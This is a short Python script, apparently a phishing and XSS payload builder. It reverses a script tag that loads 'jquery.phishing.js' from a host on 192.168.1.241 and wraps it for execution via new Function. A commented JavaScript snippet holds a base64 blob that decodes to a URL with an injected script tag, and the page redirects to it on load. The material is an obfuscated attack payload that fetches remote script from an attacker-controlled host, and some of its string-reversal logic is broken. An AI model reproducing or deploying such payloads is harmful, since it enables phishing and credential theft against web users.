import base64

payload = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
</body>
</html>
'''

def rev_(payload):
    return payload[::-1]

host = 'http://192.168.1.241:1337/?username=ninjaki'

js = rev_('<script src="http://192.168.1.241:8081/jquery.phishing.js"></script>')
#js = '<script src="http://192.168.1.241:8081/jquery.phishing.js"></script>'

rev_exec_js = '''
new Function("%s".split().reverse().join(""))();
''' % (js, )


print(js)

#'>tpircs/<>"sj.gnihsihp.yreuqj/1808:142.1.861.291//:ptth"=crs tpircs<'.split().reverse().join("");

"""
<script>
        window.onload = function () {
            let blob = "aHR0cDovLzE5Mi4xNjguMS4yNDE6MTMzNy8/dXNlcm5hbWU9bmluamFraTxzY3JpcHQgc3JjPSJodHRwOi8vMTkyLjE2OC4xLjI0MTo4MDgxL2pxdWVyeS5waGlzaGluZy5qcyI+PC9zY3JpcHQ+";

            window.location.href = atob(blob);
        };
    </script>
"""

